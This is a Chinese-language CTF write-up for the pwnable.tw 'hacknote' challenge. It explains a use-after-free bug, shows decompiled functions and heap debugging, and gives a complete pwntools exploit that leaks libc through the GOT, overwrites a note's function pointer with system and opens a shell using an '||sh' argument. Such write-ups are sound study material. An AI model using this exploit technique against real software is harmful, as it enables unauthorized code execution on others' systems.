# HackNote

简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况

- 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。
- 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么**程序很有可能可以正常运转**。
- 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，**就很有可能会出现奇怪的问题**。

而我们一般所指的 **Use After Free** 漏洞主要是后两种。此外，**我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。**

首先检查一下程序

```
syc@ubuntu:~/Desktop/share/攻防世界PWN/hacknote$ checksec hacknote
[*] '/mnt/hgfs/share/\xe6\x94\xbb\xe9\x98\xb2\xe4\xb8\x96\xe7\x95\x8cPWN/hacknote/hacknote'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

然后用IDA Pro检查一下程序

```c
void __cdecl __noreturn main()
{
  int v0; // eax
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v2; // [esp+Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, &buf, 4u);
      v0 = atoi(&buf);
      if ( v0 != 2 )
        break;
      Delete_note();
    }
    if ( v0 > 2 )
    {
      if ( v0 == 3 )
      {
        Print_note();
      }
      else
      {
        if ( v0 == 4 )
          exit(0);
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v0 != 1 )
        goto LABEL_13;
      Add_note();
    }
  }
}
```

我们可以简单分析下程序，可以看出在程序的开头有个 menu 函数，其中有

```
  puts(" 1. Add note          ");
  puts(" 2. Delete note       ");
  puts(" 3. Print note        ");
  puts(" 4. Exit              ");
```

故而程序应该主要有 3 个功能。之后程序会根据用户的输入执行相应的功能。

#### add_note

根据程序，我们可以看出程序最多可以添加 5 个 note。每个 note 有两个字段 put 与 content，其中 put 会被设置为一个函数，其函数会输出 content 具体的内容

```
unsigned int sub_8048646()
{
  _DWORD *v0; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( dword_804A04C <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !ptr[i] )
      {
        ptr[i] = malloc(8u);
        if ( !ptr[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)ptr[i] = sub_804862B;
        printf("Note size :");
        read(0, &buf, 8u);
        size = atoi(&buf);
        v0 = ptr[i];
        v0[1] = malloc(size);
        if ( !*((_DWORD *)ptr[i] + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)ptr[i] + 1), size);
        puts("Success !");
        ++dword_804A04C;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}
```

#### print_note

print_note 就是简单的根据给定的 note 的索引来输出对应索引的 note 的内容

```
unsigned int print_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
    notelist[v1]->put(notelist[v1]);
  return __readgsdword(0x14u) ^ v3;
}
```

#### delete_note

delete_note 会根据给定的索引来释放对应的 note。但是值得注意的是，在 删除的时候，只是单纯进行了 free，而没有设置为 NULL，那么显然，这里是存在 Use After Free 的情况的

```
unsigned int del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
  {
    free(notelist[v1]->content);
    free(notelist[v1]);
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

我们可以看到**UAF**的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个**magic**函数，我们有没有可能来通过**UAF**来使得这个程序执行 **magic** 函数呢？**一个很直接的想法是修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。** 那么该怎么执行呢？                                                                         

我们可以简单来看一下每一个 **note** 生成的具体流程

1. 程序申请 8 字节内存用来存放 **note** 中的 **put** 以及 **content** 指针
2. 程序根据输入的 size 来申请指定大小的内存，然后用来存储 **content**

 基本的思路是先add 两次，但是内容的大小不能是8字节，不然会分配 4个16字节的fast bin，那我们就没办法进行UAF，所以分配content的大小必须不是8字节，然后再delete两次，此时 fastbin链表

|   note1 结构体    |   16 bytes（8B)    |  high address   |
| :---------------: | :----------------: | :-------------: |
| **note1 content** | **32 bytes（16B)** |                 |
| **note0 结构体**  | **16 bytes（8B)**  |                 |
| **note0 content** | **32 bytes（16B)** |                 |
| **fastbin head**  |                    | **low address** |

由于题目提供了**libc**，我们可以先触发一次漏洞来泄露地址，然后再触发一次漏洞来执行system

这里有个问题就是**system**函数的参数，原来的**printf**函数传入的是指向结构体的指针，那么此时system传入该函数的参数就是**note0**结构体自身，无法直接传如字符串“**\bin\sh**”，这里的知识点是**system**参数可用“||”截断，比如 **system("hsasoijiojo||/bin/sh")**

我们来调试一下

当我们进行第一次add note的时候

```c
[DEBUG] Received 0xc5 bytes:
    '----------------------\n'
    '       HackNote       \n'
    '----------------------\n'
    ' 1. Add note          \n'
    ' 2. Delete note       \n'
    ' 3. Print note        \n'
    ' 4. Exit              \n'
    '----------------------\n'
    'Your choice :'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0xb bytes:
    'Note size :'
[DEBUG] Sent 0x3 bytes:
    '32\n'
[DEBUG] Received 0x9 bytes:
    'Content :'
[DEBUG] Sent 0x8 bytes:
    'a' * 0x8
[DEBUG] Received 0xa bytes:
    'Success !\n'
```

查看堆的情况

```c
pwndbg> heap
0x9d9b008 PREV_INUSE {
  mchunk_prev_size = 0, 
  mchunk_size = 337, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x9d9b158 FASTBIN {
  mchunk_prev_size = 0, 
  mchunk_size = 17, 
  fd = 0x804862b, 
  bk = 0x9d9b170, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x31
}
0x9d9b168 FASTBIN {
  mchunk_prev_size = 0, 
  mchunk_size = 49, 
  fd = 0x61616161, 
  bk = 0x61616161, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

可以发现已经分配了一个大小为17的chunk（即note0的结构体），和一个大小为49的chunk（即note0的content），note1同理

当删除的时候fastbin列表就像我们设想的那样，这里有一个坑，如果是本地调试的话，tcache是libc2.26之后引进的一种新机制，类似于fastbin一样的东西，每条链上最多可以有 7 个 chunk，free的时候当tcache满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找

```c
gef➤  heap bins
───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x8]  ←  UsedChunk(addr=0x804b040, size=0x10)  ←  UsedChunk(addr=0x804b008, size=0x10) 
Fastbins[idx=1, size=0xc] 0x00
Fastbins[idx=2, size=0x10] 0x00
Fastbins[idx=3, size=0x14]  ←  UsedChunk(addr=0x804b050, size=0x28)  ←  UsedChunk(addr=0x804b018, size=0x28) 
Fastbins[idx=4, size=0x18] 0x00
Fastbins[idx=5, size=0x1c] 0x00
Fastbins[idx=6, size=0x20] 0x00
```

最终的EXP

```python
from pwn import *
#sh=process('./hacknote')
sh=remote('chall.pwnable.tw',10102)
elf=ELF('./hacknote')
libc=ELF('./libc_32.so.6')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')

def addnote(size,content):
    sh.recvuntil('Your choice :')
    sh.sendline('1')
    sh.recvuntil('Note size :')
    sh.sendline(str(size))
    sh.recvuntil('Content :')
    sh.send(content)

def printnote(idx):
    sh.recvuntil('Your choice :')
    sh.sendline('3')
    sh.recvuntil('Index :')
    sh.sendline(str(idx))

def delnote(idx):
    sh.recvuntil('Your choice :')
    sh.sendline('2')
    sh.recvuntil('Index :')
    sh.sendline(str(idx))

addnote(0x20,'aaaaaaaa') #idx0
addnote(0x20,'aaaaaaaa') #idx1

delnote(0)
delnote(1)
puts_got=elf.got['puts']
fun=0x0804862B
addnote(0x8,p32(fun)+p32(puts_got)) 
printnote(0)
puts_adr=u32(sh.recv(4))

print 'puts_adr: '+hex(puts_adr)
libc_base=puts_adr-libc.symbols['puts']
print 'libc_base: '+hex(libc_base)

system_adr=libc_base+libc.symbols['system']
delnote(2)
payload=p32(system_adr)+'||sh'
addnote(0x8,payload)
printnote(0)
sh.interactive()
```

